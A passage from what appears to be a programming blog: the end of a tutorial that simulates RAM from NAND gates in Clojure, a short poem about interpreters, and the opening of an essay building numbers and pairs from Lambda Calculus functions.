            r1-bits (wires :r1 8)
            r2-bits (wires :r2 8)
            r3-bits (wires :r2 8)
            s1 (-> empty-state
                   (wire-bus bw :s1 :e1 r1-bits)
                   (wire-bus bw :s2 :e2 r2-bits)
                   (wire-bus bw :s3 :e3 r3-bits)
                   (trigger-many bw [1 1 1 0 0 0 0 0])
                   (trigger :s1 0)
                   (trigger :e1 0))
            s2 (-> s1
                   (trigger :s1 1)
                   (trigger :s1 0)
                   (trigger-many bw [0 0 0 0 0 0 0 0]))
            s3 (-> s2
                   (trigger :e1 1)
                   (trigger :s3 1)
                   (trigger :s3 0)
                   (trigger :e1 0))]
        (testing "only bus should have charge"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s1 bw)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 r1-bits)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 r2-bits)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 r3-bits))))
        (testing "r1 should have the charge"
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s2 bw)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 r1-bits)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s2 r2-bits)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s2 r3-bits))))
        (testing "move r1 to r3"
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s3 bw)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 r1-bits)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s2 r2-bits)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 r3-bits))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 12 assertions.
    ; 4 failures, 0 errors.

\[/code\]

🙀 uh oh, it doesn't work...

## 10: Evolve Trigger

Let's look at this diagram again:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2ODU4LTIzN2MzMzAwLTBjOTMtMTFlYi04YzFmLWE0ODJhYWIwMzExZi5wbmc)

Remember that the `bus` wires can "receive" a charge now from the
outputs of `R1` , `R2`, or `R3`. Here's how our `set-charge` looked:

\[code\]

    (defn set-charge [state wire charge]
      (assoc-in state [:charge-map wire] charge))

\[/code\]

Imagine if `R1` was enabled and a wire was charged to `1`. What would
happen if `R3` got triggered?

**It would overwrite our charge!**

Time to to evolve our model. One way to think about it, is that
`bus wires` now have multiple "sources" that can provide a charge. Let's
update our charge functions to keep track of this "source"

\[code\]

    (defn set-charge
      ([source state w v]
       (assoc-in state [:charge-map w source] v)))

    (defn charge [{:keys [charge-map]} w]
      (when-let [charges (vals (charge-map w))]
        (apply max charges)))


    (set-charge empty-state :nand-a :w 1)
    ; => {:charge-map {:w {:nand-a 1}}, :nand-gates []}
    (let [s1 (-> empty-state
                   (set-charge :nand-a :w 1)
                   (set-charge :nand-b :w 0))]
        (charge s1 :w))
    ; => 1

\[/code\]

Nice. Now, whenever we set a charge, we are aware of waht source it
comes from.

Let's update `trigger` to include a `source` too:

\[code\]

    (defn trigger
      ([state wire new-v] (trigger :repl state wire new-v))
      ([source state wire new-v]
       (let [old-charge (charge state wire)
             state' (set-charge state source wire new-v)
             new-charge (charge state' wire)]
         (if (= old-charge new-charge)
           state'
           (reduce (fn [acc-state out] (trigger-nand-gate acc-state out))
                   state'
                   (dependent-nand-gates state' wire))))))

\[/code\]

And let's make `trigger-nand-gate` use a source:

\[code\]

    (defn trigger-nand-gate
      [state {:keys [ins out]}]
      (let [new-charge (apply nand-output (charges state ins))]
        (trigger (apply kw (conj ins out)) state out new-charge)))

\[/code\]

Now each `NAND` gate triggers with a specific name as a source. This
would make it so `R1`\'s output trigger wouldn't interfere with `R2`
output trigger! Let's test out the bus again:

\[code\]

    ; Ran 1 test containing 12 assertions.
    ; No failures.

\[/code\]

We're back.

## 11: Simulate and-n

Right now, our `and` gate *only* tests whether two inputs are both 1.
What if we wanted to test that *three* inputs are all 1? We could just
wire up a bunch of `AND` gates together:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2OTQ4LTQ0ZGQxZjAwLTBjOTMtMTFlYi05NWM4LWQwNWRhYjk1ZjI0MC5wbmc)

Let's call this the `AND-N` gate. It can take `N` number of inputs, and
produces one output. We can wire this up using some nice recursion:

\[code\]

    (defn wire-and-n [state ins out]
      (let [[a b] (take 2 ins)
            rem (drop 2 ins)]
        (if-not (seq rem)
          (wire-and-gate state a b out)
          (let [w (wire (kw a b :-and))]
            (wire-and-n
              (wire-and-gate state a b w)
              (list* w rem)
              out)))))

\[/code\]

We keep recursing wire up the inputs as `AND` gates, until we're only
left with two. Let's see how it works:

\[code\]

    (deftest test-and-n
      (let [ii [:a :b :c :d :e]
            s1 (-> empty-state
                   (wire-and-n ii :o)
                   (trigger-many ii [1 1 1 1 0]))
            s2 (trigger-many s1 ii [1 1 1 1 1])]
        (testing "if only some are charged, o is off"
          (is (= '(1 1 1 1 0)
                 (charges s1 ii)))
          (is (= 0 (charge s1 :o))))
        (testing "if all are on, we are on"
          (is (= '(1 1 1 1 1)
                 (charges s2 ii)))
          (is (= 1 (charge s2 :o))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 4 assertions.
    ; No failures.

\[/code\]

## 12: Simulate decoder

Now, Say we have two inputs (`a` `b`), and we want to know *how* they
are charged: (a0 b0) (a0 b1) (a1 b0) (a1 b1).

We could make a machine that figures that out:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2OTgzLTU0NWM2ODAwLTBjOTMtMTFlYi05YTM1LWFkNjVmYjVlYjQxZC5wbmc)

It's called a decoder. It guarantees that only *one* wire will turn on,
and each wire will represent a specific state of `a` and `b`. Here's how
we could do it:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2OTk3LTU5YjliMjgwLTBjOTMtMTFlYi04N2RmLWQ0MTJkZGNiNDRlZS5wbmc)

This looks like a lot, but in essence it's pretty simple. Each input is
wired into a `NOT` gate. Now let's take an example: what would happen If
we wire the `NOT` outputs of `a` & `b` to an `AND` gate?

If that `AND` output turned "1", it would mean that *both* `a` and `b`
*had* to be 0! This would mean the output wire of that `AND` gate, when
"1", represents the selection (a0 b0). We can keep wiring `AND` gates
like this, to represent all different selections.

It can even be generalized: for N inputs, we create N `NOT` outputs.
Then we can wire them up to `and-n` gates in such a way that the output
represents the a special selection.

Let's do that. First, we'll need to install Clojure's math combinatorics
library in our `deps.edn`:

\[code\]

    {:deps {org.clojure/math.combinatorics {:mvn/version "0.1.6"}}}

\[/code\]

Now let's require it:

\[code\]

    (:require [clojure.math.combinatorics :as c])

\[/code\]

With this we can create a quick function that produces our "wire"
selection mapping:

\[code\]

    (def decoder-mapping (partial c/selections [0 1]))

\[/code\]

\[code\]

    (decoder-mapping 2)
    ; => ((0 0) (0 1) (1 0) (1 1))

\[/code\]

Perfect, this gives us a "selection". We can use these "selections", to
decide what the combination of wires should be for an `and-n` gate.

Here's how the decoder could look:

\[code\]

    (defn wire-decoder
      [state ins outs]
      (let [ins-nots (mapv #(wire (kw % :-not)) ins)
            state' (reduce
                     (fn [acc-state [in out]]
                       (wire-not-gate acc-state in out))
                     state
                     (map vector ins ins-nots))
            state'' (reduce
                      (fn [acc-state [sel out]]
                        (let [and-ins (map-indexed
                                        (fn [i sign]
                                          (if (= sign 0)
                                            (nth ins-nots i)
                                            (nth ins i)))
                                        sel)]
                          (wire-and-n acc-state and-ins out)))
                      state'
                      (map vector (wire-mapping (count ins)) outs))]
        state''))

\[/code\]

...Pretty elegant. Thank you Clojure. We first wire up a bunch of `NOT`
wires. Then we generate a bunch of selections, and for each one wire up
and `and-n` gate. We wire either from `ins` or `in-nots`, based on what
the selection tells us.

The ultimate question...will it work?!

\[code\]

    (deftest test-decoder
      (let [ii (wires :i 4)
            os (wires :o 16)
            sels (wire-mapping (count ii))
            sel (nth sels 5)
            o (nth os 5)
            s1 (-> empty-state
                   (wire-decoder ii os)
                   (trigger-many ii sel))]
        (testing "only 1 output is on"
          (is (= 1 (charge s1 o)))
          (is (every? zero? (charges s1 (remove #{o} os)))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 2 assertions.
    ; No failures.

\[/code\]

😦

## 13: Simulate Lookup

With all of this, we can wire together the first part of RAM. We need a
way to "look up" a byte.

What if we took one byte --- let's call it `mar` --- and wired the first
4 outputs to one decoder, and the last 4 outputs to another decoder?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3MDcwLTc3ODcxNzgwLTBjOTMtMTFlYi04NzExLWQ0MGE3OWI2MWVlMS5wbmc)

Well, this would produce 256 output wires. **For each value in the`mar`
byte, *two* output wires would be on:** one from the first decoder, and
the other from the second decoder.

We can think of this then, like a 16x16 grid. Each "byte" in `mar`
represents a unique "intersection" in the grid. Now, in the future we
can tie some registers to those grid wires, and when an "intersection"
is on, we can make that register *active*! Pretty cool.

Let's build it:

\[code\]

    (defn wire-mar
      [state s is os first-4-outs last-4-outs]
      (-> state
          (wire-byte s is os)
          (wire-decoder (take 4 os) first-4-outs)
          (wire-decoder (drop 4 os) last-4-outs)))

\[/code\]

Will it work?

\[code\]

    (deftest test-mar
      (let [ii (wires :i 8)
            os (wires :o 8)
            first-4-decoders (wires :fd 16)
            last-4-decoders (wires :ld 16)
            s1 (-> empty-state
                   (wire-mar :s ii os first-4-decoders last-4-decoders)
                   (trigger-many ii [0 0 0 0 0 0 0 0])
                   (trigger :s 0))
            sel (nth (wire-mapping 4) 5)
            s2 (trigger-many s1 ii (concat sel sel))
            s3 (-> s2
                   (trigger :s 1)
                   (trigger :s 0))
            test-idx (fn [state idx]
                       (let [fd (nth first-4-decoders idx)
                             ld (nth last-4-decoders idx)]
                         (is (= 1 (charge state fd)))
                         (is (every? zero? (charges state (remove #{fd} first-4-decoders))))
                         (is (= 1 (charge state ld)))
                         (is (every? zero? (charges state (remove #{ld} last-4-decoders))))))]
        (testing
          "by default only one wire is on, and it's the correct mapping"
          (test-idx s1 0))
        (testing
          "even if ii changes, sel doesn't change b/c s is 0"
          (test-idx s2 0))
        (testing
          "once s triggers, the sel does change"
          (test-idx s3 5))))

\[/code\]

\[code\]

    ; Ran 1 test containing 12 assertions.
    ; No failures.

\[/code\]

Nice, we can look something up!

## 14: Simulate IO

Time to complete the picture:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3MTEzLThmZjczMjAwLTBjOTMtMTFlYi04YTRhLWQxMmU3YWY2M2JhMy5wbmc)

We're going to add an `io` bus at the bottom, a `set` wire an `enable`
wire. For each "intersection" from our decoders, what would happen if we
did this?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3MTI0LTk0YmJlNjAwLTBjOTMtMTFlYi04OWYyLTkyYzRhYThhZjRiMS5wbmc)

The `top decoder wire` and `left decoder wire` are fed into an `AND`
gate that outputs `x`. `x` will only be "on" when *both* decoder wires
are "on". That means `x` would represent whether our intersection is
active!

`x` and `io-s` are fed into an `AND` gate, which produces `s.` `s` will
only turn on, when both `io-s` is charged *and* the intersection is
active.

`x` and `io-e` are fed an `AND` gate, producing `e`. This will only turn
on, when both `io-e` is charged, *and* the intersection is active.

After that, we take `s` `e` and the `io` wires, and connect them to a
register.

If we follow that logic, it means that this register can be enabled and
set, *only* when the intersection is "on"! If hooked this up to each
intersection...all of a sudden we have 256 bytes of memory!

Let's write this to work with just one intersection:

\[code\]

    (defn wire-io
      [state io-s io-e ios decoder-o-1 decoder-o-2 register-bits]
      (let [x (wire (kw decoder-o-1 decoder-o-2 :x))
            s (wire (kw decoder-o-1 decoder-o-2 :s))
            e (wire (kw decoder-o-1 decoder-o-2 :e))]
        (-> state
            (wire-and-gate decoder-o-1 decoder-o-2 x)
            (wire-and-gate x io-s s)
            (wire-and-gate x io-e e)
            (wire-bus ios s e register-bits))))

\[/code\]

Does it work?

\[code\]

    (deftest test-io
      (let [ios (wires :io 8)
            rs (wires :r 8)
            s1 (-> empty-state
                   (wire-io :s :e ios :w1 :w2 rs)
                   (trigger-many ios [0 0 0 0 0 0 0 0])
                   (trigger-many [:s :e :w1 :w2] [0 0 0 0])
                   (trigger-many ios [1 1 1 0 0 0 0 0]))
            s2 (trigger s1 :s 1)
            s3 (trigger-many s2 [:w1 :w2] [1 1])
            s4 (-> s3
                   (trigger :s 0)
                   (trigger-many ios [0 0 0 0 0 0 0 0]))
            s5 (trigger s4 :e 1)]
        (testing "io set, but reg not affected"
          (is (= '(1 1 1 0 0 0 0 0) (charges s1 ios)))
          (is (= '(0 0 0 0 0 0 0 0) (charges s1 rs))))
        (testing "io set enable doesn't change, because intersection is not on"
          (is (= '(1 1 1 0 0 0 0 0) (charges s2 ios)))
          (is (= '(0 0 0 0 0 0 0 0) (charges s2 rs))))
        (testing "once intersection is on, charge transfers"
          (is (= '(1 1 1 0 0 0 0 0) (charges s3 ios)))
          (is (= '(1 1 1 0 0 0 0 0) (charges s3 rs))))
        (testing "once s turns off again, changes to io don't make a difference"
          (is (= '(0 0 0 0 0 0 0 0) (charges s4 ios)))
          (is (= '(1 1 1 0 0 0 0 0) (charges s4 rs))))
        (testing "if we turn on e, the r charge transfers to the io"
          (is (= '(1 1 1 0 0 0 0 0) (charges s5 ios)))
          (is (= '(1 1 1 0 0 0 0 0) (charges s5 rs))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 10 assertions.
    ; No failures.

\[/code\]

Great!

## 15: Wire RAM

Now, all we need to do is to `wire-mar`, and for each intersection,
`wire-io`. Let's do that:

\[code\]

    (defn wire-ram [state mar-s mar-is io-s io-e ios]
      (let [mar-os (wires :mar-o 8)
            mar-first-4-outs (wires :mar-dec-f 16)
            mar-last-4-outs (wires :mar-dec-l 16)
            state' (wire-mar state mar-s mar-is mar-os mar-first-4-outs mar-last-4-outs)
            intersections (c/cartesian-product mar-first-4-outs mar-last-4-outs)
            state'' (reduce
                      (fn [acc-state [fw lw]]
                        (wire-io acc-state io-s io-e ios fw lw
                                 (wires (kw fw lw :rb) 8)))
                      state'
                      intersections)]
        state''))

\[/code\]

We first `wire-mar`. Then, we use `cartesian-product` to create a list
of decoder intersections. For each of those intersections, we `wire-io`.
Congratulations, you've wired together RAM!

## 16: Evolve state

Now, let's take a look at how many NAND gates we have when we set our
ram up:

\[code\]

    (def ram (wire-ram
               empty-state
               :mar-s
               (wires :mar-i 8)
               :io-s
               :io-e
               (wires :io 8)))


    (count (:nand-gates ram))
    ; => 14056

\[/code\]

That's a lot. Let's try triggering something. How long does it take?

\[code\]

    (trigger ram :mar-s 1)
    ; ...

\[/code\]

Oi. Veery long. Why? Well, let's remember our `dependent-nand-gates`:

\[code\]

    (defn dependent-nand-gates [state wire]
      (filter
        (fn [{:keys [ins]}] (some #{wire} ins))
        (:nand-gates state)))

\[/code\]

Every time a wire is triggered, we go through all 14056 `NAND` gates!
That's a lot of iteration for finding what is probably a few NAND gates.

Let's make that faster:

\[code\]

    (def empty-state {:charge-map {} :in->nand-gate {}})

    (defn wire-nand-gate [state a b o]
      (reduce
        (fn [acc-state in]
          (update-in acc-state
                     [:in->nand-gate in]
                     (fn [xs] (conj (or xs []) {:ins [a b] :out o}))))
        state
        [a b]))

    (defn dependent-nand-gates [state wire]
      (get-in state [:in->nand-gate wire]))

\[/code\]

Here, we make *accessing* dependent `NAND` gates fast. Now it's a matter
of a dictionary lookup. If we try it out, it'll be muuch faster!

## 17: Testing it out!

Okay, we built it, we made it fast, but will it work? Let's imagine we
built a machine like this:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3MTQ1LWExNDAzZTgwLTBjOTMtMTFlYi05MWVmLTgxN2QxNzhkODJiYS5wbmc)

1.  We wire up `mar switches` to the `mar` byte, and add a switch to the
    `set` wire 1. *Depending on which switches we turn on, we can set a
    specific byte in* *`mar`,* *and access a specific "register" in our
    grid!*
2.  We wire up `io lights` 1. Whenever `io` has a charge, those lights
    will go on. Whichever light is on means 1, whichever light is off
    means 0. *This will tell us the byte that is on the`io` bus!*
3.  We tie the `io-s` wire to the `io set` switch 1. When that switch is
    on, the `io-s` wire will be on, and as a result the currently active
    register's "set" wire will be on. *This will let us "save" whatever
    charge is in`io`*!
4.  We tie the `io-e` wire to an `io enable` switch 1. When that switch
    is on, the `io-e` wire will be on, and as a result the currently
    active register's "enable" wire will be on. *This will let us "pass"
    the active register's charge into* *`io`.* *That will cause*
    *`io lights`* *to turn* *on and let us read the value in the
    register!*
5.  We wire up `io switches` 1. *These switches will allow us to set a
    specific charge into* *`io`.* *If we combine this by toggling our io
    "set" switch, we can save a specific charge into the active
    register!*

With a machine like that, we can now use our RAM! Here's how.

( *I recommend following along on the diagram above)*

**To access a specific register:**

1.  Use the `MAR switches`, to select the exact intersection we want,
    and toggle the `mar set` switch
2.  Toggle the `io enable` switch . This will send the active register's
    data into `io`
3.  Look at the `io lights`: The combination of lights that are on
    represent the value of the register!
4.  When done, toggle the `io enable` switch off.

**To set data to a specific register:**

1.  Use the `MAR switches`, to select the exact intersection we want
2.  Use the `IO switches`, to set the charge in IO that represents the
    data we want to save.
3.  Toggle the `io set` switch on. Now the charge of `io` will be saved
    to that specific register!
4.  Now toggle the `io set` switch off, and toggle all the `io switches`
    off.
5.  Badabing, badaboom. you've saved your data!

Let's go ahead and create that machine.

First, let's create a quick helper function to initialize our RAM:

\[code\]

    (defn initialize-ram [mar-s mar-is io-s io-e ios]
      (-> empty-state
          (wire-ram mar-s mar-is io-s io-e ios)
          (trigger-many mar-is [0 0 0 0 0 0 0 0])
          (trigger-many ios [0 0 0 0 0 0 0 0])
          (trigger-many [mar-s io-s io-e]
                        [0 0 0])))

\[/code\]

Next, here's a quick helper function to "set" data into our `mar` byte:

\[code\]

    (defn set-mar [state mar-s mar-is mar-vs]
      (-> state
          (trigger-many mar-is mar-vs)
          (trigger mar-s 1)
          (trigger mar-s 0)))

\[/code\]

Here's the function that follows our recipe to "access a specific
register"

\[code\]

    (defn handle-read [state mar-s mar-is io-e ios loc]
      (let [charge-bus-with-register (-> state
                                         (set-mar mar-s mar-is loc)
                                         (trigger io-e 1))
            next (-> charge-bus-with-register
                     (trigger io-e 0))]
        (println (str "> " (string/join (charges charge-bus-with-register
                                              ios))))
        next))

\[/code\]

Here's the function that follows our recipe to "set data to a specific
register"

\[code\]

    (defn handle-write [state mar-s mar-is io-s ios loc vs]
      (let [next (-> state
                     (set-mar mar-s mar-is loc)
                     (trigger-many ios vs)
                     (trigger io-s 1)
                     (trigger io-s 0)
                     (trigger-many ios [0 0 0 0 0 0 0 0]))]
        (println "> done")
        next))

\[/code\]

With these two things, we can create a REPL loop:

\[code\]

    (defn ram-repl []
      (println
        (str "🔥 Ram Simulation: Type a command. Here's what you can do: \n"
             "   (read [1 0 1 0 1 0 1 0]) \n"
             "   (write \[1 0 1 0 1 0 1 0\] [1 1 1 1 1 1 1 1]) \n"
             "   (exit)"))
      (let [mar-is (wires :mar-i 8)
            ios (wires :mar-io 8)
            initial-state (initialize-ram :mar-s mar-is :io-s :io-e ios)]
        (loop [state initial-state]
          (let [input (read-string (read-line))
                cmd (first input)
                args (rest input)]
            (condp = cmd
              'read
              (recur (handle-read state :mar-s mar-is :io-e ios (first args)))
              'write
              (recur (handle-write state :ms mar-is :io-s ios (first args) (second args)))

              'exit
              (println "> Goodbye!"))))))

\[/code\]

And see how it goes:

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3MjM3LWM2MzRiMTgwLTBjOTMtMTFlYi04ZTdmLTMxYjcxN2MwNmQ3OS5naWY)

Let's take a moment to bask in our circuit:

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc3ODAxLWUzYjY0YjAwLTBjOTQtMTFlYi05MDQ5LWI5MWIyNGYxN2M0Yi5naWY)

## Fin

Wow. we did it. 14056 NAND gates. 256 bytes of RAM. I hope you had a
blast 🙂 --- If you want to see how the rest of the computer is made, I
definitely suggest checking out [Scott's
book](https://www.amazon.com/But-How-Know-Principles-%20Computers-ebook/dp/B00F25LEVC).
He also has [a great site with more example
projects](http://www.buthowdoitknow.com/). To see the code all together,
[here's the
repo](https://github.com/stopachka/ram/blob/main/src/ram.clj).

------------------------------------------------------------------------

*Thanks to Daniel Woelfel, Julien Odent, Sean Grove, Paul Vorobyev,
Alexander Kotliarskyi, Alex Reichert, Poornamidam for reviewing drafts
of this essay.*

\(1\) I say this pretty lightly, but treating the charge on circuits as
code was a pretty [phenomenal
innovation](https://en.wikipedia.org/wiki/Claude_Shannon#Logic_circuits).
I could only imagine what it might have been like, when Shannon showed a
full- adder.

\(2\) To *really* model circuits, we'd need to learn about Maxwell's
equations. Just ordered a textbook for this, so maybe next time 🙂.

\(4\) That [stack
exchange](https://electronics.stackexchange.com/questions/524618/how-does-%20electricty-flow-in-a-flip-flop-circuit-i-cant-understand-how-%20memory-b?noredirect=1#comment1351903_524618)
question helped me a lot. If you're even more curious, start with [this
youtube video](https://www.youtube.com/watch?v=KM0DdEaY5sY), and follow
along until the gentleman gets to the "D" latch. He uses NOR gates, but
the essence is the same.

\(5\) There were a
[lot](https://en.m.wikipedia.org/wiki/Comparison_of_instruction_set_architectures#Bits)
of different kind of architectures that were tried.

# The Interpreter

You kick off\
A function in a sea of functions, variables and classes\
While with some you compose\
Many others you certainly oppose\
I mean c\'mone, classes\...you know they\'re assess

But you grow up, and you take a step back\
At the end of the day we're all just functions, you think\
Just a light facade, abstractions of one big hack

But you grow even more\
You listen to the rhythm\
And notice a much simpler algorithm\
Jump, subtract, add, that\'s the only score

No here, no there, no good no bad

Time passes\
And you feel the refactoring coming\
So you take a moment to assess\
For you know fear is unbecoming

All of a sudden it hits you

There\'s no jump, no add, no subtract\
Just electricity, flowing all at once, ever present\
Nothing abstract\
You smile, content

------------------------------------------------------------------------

A poem, inspired by the idea that \"our mind is the interpreter of
reality\"

# Fun with Lambda Calculus

In 1935, a gentleman called Alonzo Church came up with a simple scheme
that could compute...just about anything. His scheme was called Lambda
Calculus. It was a phenomenal innovation, given that there weren't even
computers for him to test out his ideas. Even cooler is that those very
ideas affect us today: anytime you use a function, you owe a hat tip to
Mr. Church.

Lambda Calculus is so cool that many hackers use it as their secret
handshake --- a "discreet signal" if you will. The most famous, of
course, is PG's Y Combinator. In this essay, we'll find out what it's
all about, and do things with functions that we'd never have imagined.
In the end you'll have built just about every programming concept:
numbers, booleans, you name it...just with functions.

## 0: Intuition with Pairs

City dwellers who drive SUVs rarely consider their cars as ferocious
machines that traverse rocky deserts and flooded rivers. It's the same
with programmers and functions. Here's what we *think* functions do:

\[code\]

    (def square (fn [x] (* x x)))

\[/code\]

Safe, clean, and useful. We're so accustomed that it would surprise us
to find the myriad of ways we can bend functions to do just about
anything.

Let's step out into the wilderness a bit. Say you wanted to make a data
structure for pairs:

\[code\]

    (def pair (make-pair 0 1))
    (first pair) ; => 0
    (second pair) ; => 1

\[/code\]

How would you do it? It's sensible to use a map or a class or a record
to represent a pair. But...you could use functions too.

Here's one way we can make a pair:

\[code\]

    (def church-pair (fn [a b]
                       (fn [selector]
                         (selector a b))))

\[/code\]

No maps or classes...it just returns a function!

\[code\]

    (def ex-pair (church-pair 0 1))
    ex-pair
    ; => #object[church_factorial$church_pair...

\[/code\]

Now our `ex-pair` takes a `selector` argument. What if we ran ex-pair
with this selector:

\[code\]

    (ex-pair (fn [a b] a))

\[/code\]

Well, `(ex-pair (fn [a b] a))` would expand too:

\[code\]

    ((fn [a b] a) a b)

\[/code\]

Which would return... `a`!

That just gave us the `first` value of our pair! We can use that to
write a `church-first` function:

\[code\]

    (def take-first-arg (fn [a b] a))
    (def church-first (fn [pair]
                        (pair take-first-arg)))

\[/code\]

\[code\]

    (church-first ex-pair)
    ; => 0

\[/code\]

And do something similar for second:

\[code\]

    (def take-second-arg (fn [a b] b))
    (def church-second (fn [pair]
                         (pair take-second-arg)))

\[/code\]

\[code\]

    (church-second ex-pair)
    ; => 1

\[/code\]

We just used functions to represent pairs. Now, since the grammar for
Lisp is just a bunch of pairs plopped together, that also means we can
represent the grammar of Lisp...with just functions!

## 1: Factorial

What we just did was analogous to a city dweller driving their SUV...on
a snowy day. It gets a *lot* crazier.

We said we could represent *everything*. Let's go ahead and try it!

Here's what can do. Let's take a function we know and love, and
implement it from top-to-bottom in Lambda Calculus.

Here's factorial:

\[code\]

    (defn factorial-clj [n]
      (if (zero? n)
        1 
        (* n (factorial-clj (dec n)))))

\[/code\]

\[code\]

    (factorial-clj 5)
    ; => 120

\[/code\]

By the end of this essay, we'll have built factorial, only with
functions.

## 2: Rules

To do this, I want to come up front and say I am cheating a little bit.
In Church's Lambda Calculus, there is no `def`, and all functions take
one argument. Here's all he says:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk2Mzc4MjA4LTc0M2VkMDgwLTExNTgtMTFlYi05YTI2LTFlMGUyOWFmNDQ0MC5wbmc)

In his rules, you define anonymous functions by popping a little `λ` in
front. What follows is the argument, following by a `.` .After the `.`
is the application.

This is very much akin to a single-argument anonymous function in
Clojure: `λ x. x` =\> `(fn [x] x)`

We could follow those rules, but writing factorial like that is going to
get hard to reason about very quickly. Let's tweak the rules just a
little bit. The changes won't affect the essence of Lambda Calculus but
will make it easier for us to think about our code. Here it goes:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk2Mzc4MjE3LTc5OWMxYjAwLTExNTgtMTFlYi05N2U5LWY0ZDIxZGE2YmJkOC5wbmc)

1\) for a single argument function, `(fn [x] x)` maps pretty well to
Church's encoding. We can go ahead and use it as is.

2\) Since Church's lambdas only take one argument, For him to express a
function with two arguments, he has to write *two* anonymous functions:

\[code\]

    (λ f. λ x. f x)

\[/code\]

This would map to:

\[code\]

    (fn [f] (fn [x] (f x))

\[/code\]

But, nesting our functions like this can get annoying in Clojure \[1\].
To make life easier for us, we'll allow for multi-argument functions:

\[code\]

    (fn [f x] (f x))

\[/code\]

3\) Finally, Church has no concepts of variables outside of what's
provided by a function definition.

For him to express

\[code\]

    (make-pair a b)

\[/code\]

He would have to "unwrap" `make-pair`

\[code\]

    ((λ a. λ b. λ selector . selector a b)
     a b)

\[/code\]

To keep our code sane, we'll allow for `def`, but with one rule:

**You can use** **`def`** **, as long as you can "replace" it with an
anonymous function and nothing breaks.**

For example, imagine if `make-pair` *referenced itself* :

\[code\]

    (def make-pair (fn [a b]
                     (make-pair ...)))

\[/code\]

This would break because if we replaced `(def make-pair …)` with an
anonymous function, there would be no variable called `make-pair`
anymore!

That's it, these are our rules. With that, we're ready to make
factorial!

## 3: Numerals

The first thing we need is the concept of a number. How can we do that?

Church thought of a pretty cool idea. What if "numbers", were
higher-order functions with two arguments: a function `f`, and a value
`v`.

\[code\]

    (def zero (fn [f v] v))

    (def one (fn [f v]
               (f (zero f v))))

    (def two (fn [f v]
               (f (one f v))))

\[/code\]

**We can figure out what number each function represents by "counting"
the number of times** **`f`** **was composed.**

For example, 0 would compose `f` zero times: it would just return `v`.
1, would compose f once: `(f v)`. 2 would compose twice: `(f (f v))`,
and so on.

To help us see these numbers in our REPL, let's create a quick converter
function:

\[code\]

    (defn church-numeral->int [church-numeral]
      (church-numeral inc 0))

\[/code\]

Since a church numeral composes `f` the number of times it is called
with `v` as the first argument, all we need to see what number it is in
Clojure, is to provide `inc` as `f` and `0` as `v`! Now `2` would do
`(inc (inc 0))` for example, and get us the corresponding Clojure
number.

\[code\]

    (map church-numeral->int [zero one two])
    ; => (0 1 2)

\[/code\]

Cool!

## 4: Inc

Take a look at how we wrote two:

\[code\]

    (def two (fn [f v]
               (f (one f v))))

\[/code\]

What we did here, is *delegate* f's composition to the numeral before
(in this case `one` ), and then just called `f` *one more time.*

What if we abstracted the `one` out?

\[code\]

    (def church-inc
      (fn [church-numeral]
        (fn [f v]
          (f (church-numeral f v))))) 

\[/code\]

Voila. Give this function a numeral, and it will return a new numeral
that calls `f` *one more time*. We've just discovered `inc`!

\[code\]

    (church-numeral->int (church-inc (church-inc one)))
    => 3

\[/code\]

Cool.

Now that we have this function, we can also write a quick helper to
translate Clojure numbers to these numbers:

\[code\]

    (def int->church-numeral
      (fn [clojure-int]
        (if (zero? clojure-int)
          zero
          (church-inc (int->church-numeral (dec clojure-int))))))

\[/code\]

\[code\]

    (church-numeral->int (int->church-numeral 5))
    => 5

\[/code\]

That'll come in handy for our REPL.

## 5: Dec: Intuition

Next up, we need a way to "decrement" a number. Well, with `inc` we
create a numeral that composes `f` *one more time*. If we can make some
kind of function that composes `f` *one less time,* then we'd have
`dec`!

To do that, we'll need to go on a short diversion.

## 6: Dec: shift-and-inc

